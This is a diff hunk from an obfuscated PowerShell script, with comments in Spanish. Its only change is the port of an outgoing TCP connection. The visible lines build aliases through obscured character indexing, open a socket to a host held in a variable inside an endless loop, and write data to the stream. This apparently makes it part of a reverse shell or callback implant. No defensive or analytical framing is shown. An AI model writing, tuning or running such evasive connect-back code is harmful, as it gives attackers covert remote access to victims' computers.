@@ -45,7 +45,7 @@ while ($true) {
     Set-Alias $r ($r[$true-11] + ($r[[byte]("0x" + "FF") -261]) + $r[[byte]("0x" + "2a") -2])
     
     # Configuracion de Puerto
-    $y = New-Object $LUNA($p,18612)
+    $y = New-Object $LUNA($p,15861)
     $z = $y.GetStream()
     $d = $s::UTF8.GetBytes($w)
     $z.Write($d, 0, $d.Length)
